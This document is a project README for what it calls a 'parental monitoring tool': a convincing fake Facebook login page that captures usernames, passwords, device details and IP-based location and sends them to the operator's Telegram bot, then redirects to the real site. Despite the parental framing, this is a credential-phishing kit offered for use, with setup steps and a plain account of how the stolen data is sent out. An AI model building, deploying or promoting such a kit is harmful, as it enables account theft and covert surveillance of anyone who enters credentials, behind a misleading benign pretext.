# Parental Monitoring Tool for Facebook

This tool creates a convincing Facebook login page that sends login notifications to your Telegram account when your children attempt to log in. Instead of actually logging in, they'll see a bedtime message.

## Features

- Realistic Facebook login page
- Sends detailed login notifications to your Telegram account
- Shows a custom bedtime message instead of logging in
- Tracks device information and location
- "Return to Facebook" button redirects to the real Facebook site

## Setup Instructions

### 1. Create a Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Start a conversation and type `/newbot`
3. Follow the instructions to create a new bot
4. BotFather will give you a bot token - save this for later
5. Start a conversation with your new bot by sending it any message (required step!)

### 2. Configure the Application

1. Rename `.env.example` to `.env`
2. Replace `your_telegram_bot_token_here` with your actual Telegram bot token
3. Save the file

### 3. Run the Application

1. Install Node.js if you don't have it already
2. Open a terminal/command prompt in the project folder
3. Run `npm install` to install dependencies
4. Run `npm run dev` to start the server
5. Open a browser and go to `http://localhost:5000`

## How it Works

When someone enters login credentials on the fake Facebook page:

1. The app captures the username/email and password
2. It collects device information (browser, operating system, screen size, etc.)
3. It determines the approximate location based on IP address
4. All this information is sent to your Telegram bot
5. A bedtime message is displayed to the user instead of logging in
6. The "Return to Facebook" button redirects to the real Facebook website

## Important Notes

- This tool is meant for parental monitoring purposes only
- Always inform your children about monitoring and establish trust
- The app doesn't actually log into Facebook or store credentials
- All login attempts are sent directly to your Telegram account

## Customization

- You can customize the bedtime message in `index.html`
- The style of the page can be modified in the CSS section of `index.html`

## Troubleshooting

- If you're not receiving Telegram notifications, make sure:
  - Your bot token is correct in the `.env` file
  - You've sent at least one message to your bot on Telegram
  - Your server has internet access

## Privacy and Security

This application runs locally on your computer and doesn't share data with any third parties except:
- Sending notifications to your Telegram bot
- Using ipinfo.io to determine location based on IP address (for display purposes only)